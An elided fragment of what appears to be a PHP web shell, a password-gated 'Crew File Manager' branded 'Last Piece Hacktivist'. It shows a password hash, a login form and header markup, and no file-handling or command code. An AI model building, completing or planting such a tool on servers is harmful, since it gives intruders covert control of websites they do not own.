...
$PASSWORD_HASH = '$2y$10$Qfrr/IF8z0Nxe8.Nxtpv7uWZcKKVGUN8fZac5bZKnlR2U9WZXka9S';
    ...
    <div class="login-card">
        <div class="login-header">
            <div class="login-logo">
                <img src="https://l.top4top.io/p_3688fo4y41.png" alt="Last Piece Hacktivist">
            </div>
            <h1 class="login-title">Last Piece Hacktivist</h1>
            <p class="login-subtitle">Crew File Manager</p>
        </div>
        ...
        <form method="POST">
            <div class="form-group">
                ...
                <input type="password" name="login_password" class="form-input" placeholder="Enter access password" autofocus required>
            </div>
    ...
    <header class="header">
        <div class="header-content">
            <div class="brand">
                ...
                <div class="brand-text"><span>Last Piece</span> Hacktivist<small>Crew File Manager</small></div>
            </div>
